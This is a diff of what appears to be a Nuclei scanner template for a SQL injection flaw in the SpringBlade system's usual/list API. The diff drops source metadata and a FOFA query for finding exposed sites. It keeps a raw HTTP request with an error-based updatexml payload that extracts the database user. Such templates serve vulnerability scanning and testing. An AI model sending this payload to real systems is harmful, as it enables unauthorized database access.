@@ -3,12 +3,8 @@ info:
   name: SpringBlade系统usual接口存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ap7ynl1zlryxtr3q'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ap7ynl1zlryxtr3q
-    fofa: body="https://bladex.vip"
 http:
 - raw:
   - 'GET /api/blade-log/usual/list?updatexml(1,concat(0x7e,user(),0x7e),1)=1 HTTP/1.1
